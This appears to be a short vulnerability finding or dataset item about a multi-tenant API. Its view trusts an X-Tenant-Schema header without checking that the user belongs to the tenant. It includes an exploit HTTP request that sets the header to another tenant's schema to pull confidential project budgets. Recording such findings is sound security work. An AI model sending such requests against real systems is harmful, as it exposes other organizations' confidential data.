diagnosis: The view switches database schema contexts dynamically using the X-Tenant-Schema header. It fails to verify that request.user is a member of the requested tenant, allowing any authenticated user to switch schemas and dump confidential project budgets of any tenant organization.
exploit_request:
GET /api/tenant/projects/ HTTP/1.1
Host: saas.example.com
Authorization: Bearer <attacker_jwt>
X-Tenant-Schema: tenant_enterprise_corp
